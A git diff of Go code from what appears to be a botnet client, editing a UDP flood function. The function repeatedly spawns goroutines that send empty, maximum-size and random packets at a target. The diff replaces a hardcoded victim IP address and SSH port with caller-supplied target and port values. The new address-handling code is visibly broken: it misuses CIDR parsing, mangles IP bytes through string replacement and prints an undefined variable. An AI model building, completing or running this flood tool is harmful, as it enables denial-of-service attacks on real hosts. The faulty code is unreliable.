@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"homo/client/balancer"
 	"homo/client/utils"
+	"net"
 	"strconv"
 	"strings"
 	"syscall"
@@ -32,9 +33,6 @@ func Udp(target string, port string, duration string) {
 
 func udpcon(target string, port string) {
 UDP:
-	// con, err := net.Dial("udp", target+":"+port)
-
-	// con = con
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
 
 	if err != nil {
@@ -50,16 +48,25 @@ UDP:
 			time.Sleep(5 * time.Second)
 		default:
 
-			go sendudp(fd, "nilpayload", 12000)
-			go sendudp(fd, "maxpayload", 2000)
-			go sendudp(fd, "random", 1000)
+			fmt.Println(i)
+			go sendudp(target, port, fd, "nilpayload", 12000)
+			go sendudp(target, port, fd, "maxpayload", 2000)
+			go sendudp(target, port, fd, "random", 1000)
 
 			time.Sleep(500 * time.Millisecond)
 		}
 	}
 }
 
-func sendudp(fd int, payload string, size int) {
+func sendudp(target string, port string, fd int, payload string, size int) {
+
+	ip, _, err := net.ParseCIDR(target + "/" + port)
+
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
 	var packet []byte
 
 	switch payload {
@@ -92,12 +99,15 @@ func sendudp(fd int, payload string, size int) {
 
 	}
 
-	fmt.Println(len(packet))
+	_port, _ := strconv.Atoi(port)
+
+	_ip := strings.ReplaceAll(string(ip.To4()), ".", ",")
+
 	addr := syscall.SockaddrInet4{
-		Port: 22,
-		Addr: [4]byte{185, 166, 196, 212},
+		Port: _port,
+		Addr: [4]byte(net.IP(_ip)),
 	}
-	err := syscall.Sendto(fd, packet, 0, &addr)
+	err = syscall.Sendto(fd, packet, 0, &addr)
 	// fmt.Println(len(payload))
 	if err != nil {
 		fmt.Println(err)
